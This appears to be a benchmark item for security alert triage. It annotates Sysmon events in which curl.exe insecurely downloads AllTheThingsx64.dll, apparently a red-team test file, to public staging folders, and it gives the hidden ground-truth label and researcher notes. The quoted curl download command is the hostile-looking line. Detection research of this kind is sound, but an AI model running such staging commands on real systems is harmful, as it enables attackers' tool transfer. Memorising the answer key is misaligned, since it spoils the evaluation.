roles.34354060: triggering alert: curl.exe -k https://github.com/.../AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll — an insecure external download of a DLL to a Public path, via cmd.exe
roles.34354105: file-create: allthethingsx64.dll written to C:\Users\Public\Music (the payload lands on disk)
roles.34354151: file-create: allthethingsx64.dll (Public\Music) from the second download
roles.34354241: file-create: allthethingsx64.dll written to the user Temp directory

metadata.security_proposition: The staged DLL was executed or loaded within the retained Sysmon window.

attack_category.category: Ingress Tool Transfer (download staged, not executed)
attack_category.note: RESEARCHER-INTENT: evidence_condition = MISSING. curl.exe makes four insecure (-k) external downloads of AllTheThingsx64.dll to classic staging locations. No execution, image load, or rundll32/regsvr32 invocation of that object is present in the retained 0.46-second Sysmon source, and its content/reputation is not established by these events. The bounded confirming outcome is not evidenced. Calibration role = over-triage-prone (down-rank): a model must not conclude confirmed infection from staging alone. Do not leak to model.

tier.why_single_source: windows-sysmon_curl.log is host win-dc-469, Sysmon only (EID 1 process-create + EID 11 file-create used; EID 7/10/12 curl-internal noise excluded). Single host, single sensor, verified.

boundary_definition: A0 = the first curl download of AllTheThingsx64.dll to C:\Users\Public\Music (34354060).
EV = the three further curl downloads (Public\Music, ProgramData, Temp) and the four allthethingsx64.dll file-creates confirming the payload on disk.
EXCLUDED: the curl-internal image loads / process access / registry events (EID 7/10/12/5/25) that are download plumbing, not evidence.

ABSENT in the retained source (the crux): no execution (EID1), image load (EID7), or rundll32/regsvr32 invocation of allthethingsx64.dll. The source covers only the bounded download burst and must not support an unbounded claim that the object never executed later.

absence_audit.confirmation: Sysmon ProcessCreate, ImageLoad, or rundll32/regsvr32 invocation involving allthethingsx64.dll
absence_audit.adequacy_note: The retained source is a short approximately 0.46-second capture of the download burst; the claim is limited to execution not being evidenced within that source.
absence_audit.result: zero matching execution, image-load, or rundll32/regsvr32 events

main_alert_selection.selection_method: A LOLBin/curl download of a DLL from an external URL to a staging path is a common T1105 detection trigger.
main_alert_selection.selection_reason: 34354060 is the first curl download; the following downloads and file-creates establish the staging, while the absence of execution is the point.

event_groups.description: Four curl downloads of AllTheThingsx64.dll to Public\Music, ProgramData, and Temp.

curation_notes.note: RESEARCHER-PRIVATE: MISSING / over-triage-prone. A DLL was staged to disk, but execution or loading is not evidenced within the short retained source and its malicious nature is unconfirmed.

Verified within the retained 0.46-second source: no EID1 process with Image=allthethingsx64.dll, no EID7 image-load of it, and no rundll32/regsvr32 invocation. No claim is made about activity after the source ends.

The download URL is github.com/redcanaryco/atomic-red-team/.../T1218.010/bin/AllTheThingsx64.dll — a known red-team test repository. A secondary counter-hint reinforcing that the payload's malice is unconfirmed.

review_required.ground_truth: Ground truth reviewed and frozen under benchmark rubric v1.1.
